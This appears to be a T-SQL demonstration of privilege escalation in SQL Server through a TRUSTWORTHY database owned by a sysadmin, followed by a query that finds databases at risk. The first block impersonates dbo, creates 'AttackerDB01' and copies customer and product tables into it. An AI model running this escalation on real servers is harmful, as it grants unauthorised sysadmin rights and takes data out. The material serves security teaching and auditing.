use TrustedDB01;
go

--// Use the ability of db_owner to simulate the ability to execute code 
--// as another user, in this case dbo. 
execute as user  = 'dbo';
	--// Create a database at the server level
	create database AttackerDB01;
	go
	--// Get data from other databases.
	select *
	into AttackerDB01.dbo.Customers
	from AdventureWorks2014.sales.Customer
	;
	select *
	into AttackerDB01.dbo.Products
	from AdventureWorks2014.Production.Product
	;
--// Revert to permissions context of logged in user.
revert
--// This works as the server will trust the code 
--// executed in the context of the database in the scope of the server.
--// Because the owner of the database is a SysAdmin, this gives SysAdmin permissions to the DBO

use TrustedDB02;
go
--// Perform the same actions as above.
execute as user  = 'dbo';
	
	--// These actions should fail as the owner of the datbase 
	--// does not have the permissions at the server level to perform the actions.
	create database AttackerDB02;
	go

	select *
	from AdventureWorks2014.sales.Customer
	;
	select *
	from AdventureWorks2014.Production.Product
	;
revert

use TempDB;
go

--// Script to identify databases at risk.
with _principals
as
(
	select members.sid as memberSid,
		members.name as PrincipalName,
		roles.name as RoleName,
		roles.is_fixed_role,
		case
			when roles.name = 'sysadmin' then 1
			else 0
		end as IsSysAdmin
	from sys.server_role_members as rm
	join sys.server_principals as roles on rm.role_principal_id = roles.principal_id
	right join sys.server_principals as members on rm.member_principal_id = members.principal_id
)
select d.name as dbName,
	d.is_trustworthy_on,
	p.PrincipalName as DatabaseOwner,
	p.RoleName,
	p.IsSysAdmin
from sys.databases as d
join _principals as p on d.owner_sid = p.memberSid
where d.is_trustworthy_on = 1
	and p.IsSysAdmin = 1
;